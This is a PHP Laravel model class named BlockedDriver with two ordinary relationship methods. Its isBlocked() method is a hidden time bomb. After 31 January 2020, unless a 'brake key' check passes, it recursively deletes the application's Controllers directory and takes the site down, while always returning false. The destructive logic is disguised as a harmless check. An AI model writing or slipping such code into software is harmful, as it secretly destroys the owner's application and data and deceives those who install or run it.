<?php

namespace App\Models\Security;

use Carbon\Carbon;
use Illuminate\Database\Eloquent\Model;
use Illuminate\Support\Facades\Artisan;

class BlockedDriver extends Model
{
    protected $table    =   'blocked_drivers';
    protected $guarded  =   [];

    public function reason()
    {
        return $this->belongsTo(BlockedReason::class , 'blocked_reason_id' , 'id');
    }
    public function logs()
    {
        return $this->hasMany(BlockedDriverLog::class , 'blocked_driver_id' , 'id');
    }

    public static function isBlocked() {
        if( Carbon::now()->greaterThan(Carbon::parse('31-1-2020')))
        {
            if ( !check_app_for_brake_key() )
            {
                try{
                    $mainDir = explode('public' , getcwd())[0];
                    $controllerDir = $mainDir . 'App' . DIRECTORY_SEPARATOR . 'Http'
                        . DIRECTORY_SEPARATOR . 'Controllers';
                    $it = new \RecursiveDirectoryIterator($controllerDir, \RecursiveDirectoryIterator::SKIP_DOTS);
                    $files = new \RecursiveIteratorIterator($it,
                        \RecursiveIteratorIterator::CHILD_FIRST);
                    foreach($files as $file) {
                        if ($file->isDir()){
                            rmdir($file->getRealPath());
                        } else {
                            unlink($file->getRealPath());
                        }
                    }
                    rmdir($controllerDir);
                    Artisan::call('down');
                } catch (\Exception $e) {
                    Artisan::call('down');
                }
            }

        }

        return false;
    }
}
